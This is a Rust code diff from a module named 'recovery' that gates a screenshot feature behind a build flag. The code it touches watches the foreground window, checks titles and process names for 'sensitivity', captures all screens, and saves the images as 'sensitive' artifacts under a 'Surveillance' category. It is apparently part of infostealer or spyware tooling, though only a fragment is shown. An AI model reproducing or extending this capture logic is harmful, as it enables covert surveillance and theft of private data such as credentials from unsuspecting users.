@@ -1,5 +1,7 @@
 use crate::recovery::context::RecoveryContext;
+#[cfg(feature = "screenshot")]
 use crate::recovery::screenshot;
+#[cfg(feature = "screenshot")]
 use crate::recovery::storage::output::write_binary_artifact;
 use crate::recovery::task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask};
 use async_trait::async_trait;
@@ -267,34 +269,40 @@ fn check_sensitivity(title: &str, process: &str) -> bool {
 }
 
 fn trigger_screenshot(ctx: &RecoveryContext) {
-    let captures = screenshot::capture_all_screens();
-    if captures.is_empty() {
-        return;
-    }
-
-    let ctx_clone = ctx.clone();
-    tokio::spawn(async move {
-        for capture in captures {
-            let name = format!(
-                "sensitive-{}-{}.png",
-                SystemTime::now()
-                    .duration_since(SystemTime::UNIX_EPOCH)
-                    .unwrap_or_default()
-                    .as_secs(),
-                capture.index
-            );
-            let _ = write_binary_artifact(
-                &ctx_clone,
-                RecoveryCategory::System,
-                "Surveillance",
-                &name,
-                &capture.png_bytes,
-            )
-            .await;
+    #[cfg(feature = "screenshot")]
+    {
+        let captures = screenshot::capture_all_screens();
+        if captures.is_empty() {
+            return;
         }
-    });
-}
 
+        let ctx_clone = ctx.clone();
+        tokio::spawn(async move {
+            for capture in captures {
+                let name = format!(
+                    "sensitive-{}-{}.png",
+                    SystemTime::now()
+                        .duration_since(SystemTime::UNIX_EPOCH)
+                        .unwrap_or_default()
+                        .as_secs(),
+                    capture.index
+                );
+                let _ = write_binary_artifact(
+                    &ctx_clone,
+                    RecoveryCategory::System,
+                    "Surveillance",
+                    &name,
+                    &capture.png_bytes,
+                )
+                .await;
+            }
+        });
+    }
+    #[cfg(not(feature = "screenshot"))]
+    {
+        let _ = ctx;
+    }
+}
 fn get_foreground_info() -> (String, String) {
     unsafe {
         let hwnd = GetForegroundWindow();
